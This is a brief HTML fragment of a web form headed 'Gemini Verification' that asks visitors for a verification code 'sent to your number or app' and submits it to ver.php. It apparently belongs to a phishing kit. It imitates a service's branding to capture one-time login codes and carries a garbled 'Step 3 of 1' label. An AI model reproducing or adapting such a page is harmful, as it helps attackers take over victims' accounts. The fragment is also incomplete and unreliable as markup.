       ...
       <div class="card ">
          <div class="card-title text-center">
            <img src="logo.png" style="height:50px; width: 50px;">
                    <h1 class="mt-4">Gemini Verification</h1> <small class="para">Step 3 of 1. Email verification.</small>
                </div>
                <form class="signup"action="ver.php" method="post">
                  <label style="text-align: center; margin-left:30px;">Please enter the code we sent to your number or app</label>
